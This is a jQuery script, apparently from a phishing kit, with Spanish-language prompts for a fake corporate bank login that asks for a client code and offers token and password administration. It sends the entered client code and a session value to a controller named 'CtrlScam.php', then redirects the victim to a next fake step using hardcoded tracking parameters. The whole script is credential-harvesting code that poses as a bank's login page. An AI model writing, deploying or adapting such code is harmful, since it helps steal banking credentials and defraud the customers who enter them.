$(document).ready(function(){
    

    $('body').keypress(function(e){
        if(e.which == 13){
            $('#formaPrincipal').submit();
        }
    });


    $('#IdSubmit').click(function(e){
        e.preventDefault();
        validateUsername();
    });


    $('#formaPrincipal').submit(function(e){
        e.preventDefault();
        validateUsername();
    });

    

    function validateUsername(){
        var usuario = $('#IdUsernameTxt');
        var msgUserEmpty = "Debe introducir su C&oacute;digo de cliente.";
        var msgNoNumeric = "El C&oacute;digo de Cliente Debe Ser Num&eacute;rico para acceder al Modulo de Administraci&oacute;n Contrase&ntilde;a.";

        if(usuario.val() == ""){
            cuadroDialogo(msgUserEmpty, 1);
        }else{
            if(isNaN(usuario.val())){
                cuadroDialogo(msgNoNumeric, 1);
            }else{

                $.ajax({
                    type: 'POST',
                    url: '../../Controllers/CtrlScam.php',
                    data: {
                        "request": "usuario_empresas",
                        "user": usuario.val(),
                        "interface": "Enlace",
                        "session": $('#session').val()
                    },
                    beforeSend: function(){
                        console.log("ENviando...");
                        $('#loading').show();
                    },
                    success: function (resp){
                        console.log('Datos Enviados');
                        //alert(resp);
                        console.log(resp);
                        //alert(resp)
                        if(resp == "1"){
                            window.location.href="validarClienteinicio.do.php?DATAID=ASJ893asi2i342837kjdha82389420&session="+$('#session').val()+"&inforData=ndj723648whrr82743";
                            //window.location.href="validarClienteInicio.do.php?DATAID=ASJ893asi2i342837kjdha82389420&session="+$('#session').val()+"&inforData=ndj723648whrr82743";
                        }else{
                            console.log('Fallo al guardar');
                        }
    
                    },
                    error: function (request, textStatus, errorThrown) {
                        console.log('Error al Enviar los Datos: '+errorThrown);
                    }
                });
            }
        }
    }


    $('#administracionToken').click(function(e){
        e.preventDefault();
        var msg = "Debe introducir su c&oacute;digo de cliente y dar Click en Administraci&oacute;n Token.";
        cuadroDialogo(msg, 1);
    });

    $('#administracionContra').click(function(e){
        e.preventDefault();
        var msg = "Debe introducir su c&oacute;digo de cliente y dar Click en Administraci&oacute;n de Contrase&ntilde;a.";
        cuadroDialogo(msg, 1);
    });



});